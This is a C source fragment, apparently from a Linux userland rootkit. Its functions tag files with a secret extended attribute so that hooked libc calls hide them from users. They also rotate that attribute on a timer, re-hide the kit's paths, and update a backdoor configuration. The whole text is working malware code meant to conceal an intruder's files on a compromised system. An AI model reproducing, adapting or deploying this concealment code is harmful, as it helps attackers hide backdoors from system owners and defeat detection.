#ifdef ATTR_CHANGE_TIME
void magicattrchanger(void){
    if(!initmvbc() || magicusr() || rknomore() || rkprocup())
        return;
    
    time_t curtime = time(NULL),
           diff = curtime - mvbc->attrchangetime;

    if(diff >= ATTR_CHANGE_TIME){
        /* copy current attr into buffer so we know what things need rehidden. */
        char oldattr[MAGIC_ATTR_LENGTH+1];
        writeover(oldattr, mvbc->magicattr);

        /* get new attr. clear current one to write in new. */
        srand(curtime);
        char *newattr = randgarb(MAGIC_ATTR_LENGTH);
        if(!newattr) return;
        writeover(mvbc->magicattr, newattr);
        clean(newattr);
        
        /* set new change time, hide kit things & update cfg. */
        mvbc->attrchangetime = curtime;
        hidebdvpaths(mvbc, mvbc->magicid, mvbc->magicid, oldattr);
        updbdvcfg(mvbc);
    }
}
#endif

/* set or unset magic attribute on path as to (un)hide it.
 * mode must be either CSETXATTR or CREMOVEXATTR. */
int attrmodif(const char *path, const u_short mode){
    if(!initmvbc())
        return -1;

    int ret = -1;
    char attrbuf[6+strlen(mvbc->magicattr)];
    memset(attrbuf, 0, sizeof(attrbuf));
    snprintf(attrbuf, sizeof(attrbuf), "user.%s", mvbc->magicattr);

    hook(mode);
    switch(mode){
        case CSETXATTR:
            ret = (long)call(mode, path, attrbuf, mvbc->magicattr, MAGIC_ATTR_LENGTH, XATTR_CREATE);
            errno == EEXIST ? ret = 0 : 0;
            break;
        case CREMOVEXATTR:
            ret = (long)call(mode, path, attrbuf);
            break;
    }

    return ret;
}

int hidden_xattr(const char *filename, const char *magicattr){
    if(xprocess(MANDB_PATH))
        return 0;

    ssize_t buflen, olen, keylen;
    char *buf, *key;
    const char *attr;
    int ret = 0;

    hook(CLISTXATTR);

    if((buflen = (ssize_t)call(CLISTXATTR, filename, NULL, 0)) <= 0)
        return 0;

    buf = malloc(buflen);
    if(!buf) return 0;

    if((buflen = (ssize_t)call(CLISTXATTR, filename, buf, buflen)) <= 0){
        free(buf);
        return 0;
    }

    if(!magicattr && !initmvbc()){
        bfree(buf, buflen);
        return 0;
    }

    if(!magicattr) attr = mvbc->magicattr;
    else           attr = magicattr;
    olen = buflen;
    key = buf;
    while(buflen > 0 && !ret){
        strstr(key, attr) ? ret = 1 : 0;
        keylen  = strlen(key)+1;
        buflen -= keylen;
        key    += keylen;
    }
    bfree(buf, olen);
    return ret;
}

int hidden_fxattr(int fd, const char *magicattr){
    if(xprocess(MANDB_PATH))
        return 0;

    ssize_t buflen, olen, keylen;
    char *buf, *key;
    const char *attr;
    int ret = 0;

    hook(CFLISTXATTR);

    if((buflen = (ssize_t)call(CFLISTXATTR, fd, NULL, 0)) <= 0)
        return 0;

    buf = malloc(buflen);
    if(!buf) return 0;

    if((buflen = (ssize_t)call(CFLISTXATTR, fd, buf, buflen)) <= 0){
        free(buf);
        return 0;
    }

    if(!magicattr && !initmvbc()){
        bfree(buf, buflen);
        return 0;
    }

    if(!magicattr) attr = mvbc->magicattr;
    else           attr = magicattr;
    olen = buflen;
    key = buf;
    while(buflen > 0 && !ret){
        strstr(key, attr) ? ret = 1 : 0;
        keylen  = strlen(key)+1;
        buflen -= keylen;
        key    += keylen;
    }
    bfree(buf, olen);
    return ret;
}

int hidden_lxattr(const char *filename, const char *magicattr){
    if(xprocess(MANDB_PATH))
        return 0;

    ssize_t buflen, olen, keylen;
    char *buf, *key;
    const char *attr;
    int ret = 0;

    hook(CLLISTXATTR);

    if((buflen = (ssize_t)call(CLLISTXATTR, filename, NULL, 0)) <= 0)
        return 0;

    buf = malloc(buflen);
    if(!buf) return 0;

    if((buflen = (ssize_t)call(CLLISTXATTR, filename, buf, buflen)) <= 0){
        free(buf);
        return 0;
    }

    if(!magicattr && !initmvbc()){
        bfree(buf, buflen);
        return 0;
    }

    if(!magicattr) attr = mvbc->magicattr;
    else           attr = magicattr;
    olen = buflen;
    key = buf;
    while(buflen > 0 && !ret){
        strstr(key, attr) ? ret = 1 : 0;
        keylen  = strlen(key)+1;
        buflen -= keylen;
        key    += keylen;
    }

    bfree(buf, olen);
    return ret;
}